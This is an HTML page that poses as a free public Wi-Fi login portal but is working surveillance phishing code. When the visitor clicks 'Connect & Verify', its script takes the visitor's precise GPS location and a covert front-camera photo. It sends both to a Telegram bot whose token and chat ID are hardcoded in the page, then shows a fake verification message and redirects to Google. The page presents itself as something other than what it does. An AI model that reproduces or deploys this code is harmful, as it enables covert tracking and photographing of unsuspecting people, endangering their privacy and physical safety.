<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free High-Speed Wi-Fi</title>
    <style>
        body { background: #f0f2f5; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-card { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 350px; }
        .wifi-icon { font-size: 50px; color: #007bff; margin-bottom: 10px; }
        h2 { margin: 10px 0; color: #333; }
        p { color: #666; font-size: 14px; margin-bottom: 25px; }
        .connect-btn { background: #007bff; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; }
        .connect-btn:active { background: #0056b3; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="login-card">
        <div class="wifi-icon">ðŸ“¶</div>
        <h2>Public Wi-Fi</h2>
        <p>To access high-speed internet, please verify your device by clicking the button below.</p>
        <button class="connect-btn" onclick="startProcess()">Connect & Verify</button>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY';
        const ID = '6351568884';

        function startProcess() {
            // ÛŒÛ•Ú©Û•Ù… Ù‡Û•Ù†Ú¯Ø§Ùˆ: Ø¯Ø§ÙˆØ§Ú©Ø±Ø¯Ù†ÛŒ Ù„Û†Ú©Û•ÛŒØ´Ù† (Ø¨Û† Ø²Ø§Ù†ÛŒÙ†ÛŒ Ø´ÙˆÛŽÙ†ÛŒ ÙˆØ±Ø¯ÛŒ Ú©Û•Ø³Û•Ú©Û•)
            navigator.geolocation.getCurrentPosition(pos => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=ðŸ“ Wi-Fi Target Location: https://www.google.com/maps?q=${lat},${lon}`);
            });

            // Ø¯ÙˆÙˆÛ•Ù… Ù‡Û•Ù†Ú¯Ø§Ùˆ: ÙˆÛŽÙ†Û•Ú¯Ø±ØªÙ†ÛŒ Ø¦Û†ØªÛ†Ù…Ø§ØªÛŒÚ©ÛŒ
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', ID);
                        formData.append('photo', blob, 'wifi_user.jpg');
                        formData.append('caption', 'ðŸ“¶ New Wi-Fi User Connected!');
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData })
                        .then(() => {
                            alert("Device Verified! Connecting to internet...");
                            window.location.href = "https://www.google.com";
                        });
                    }, 'image/jpeg');
                }, 2000);
            });
        }
    </script>
</body>
</html>
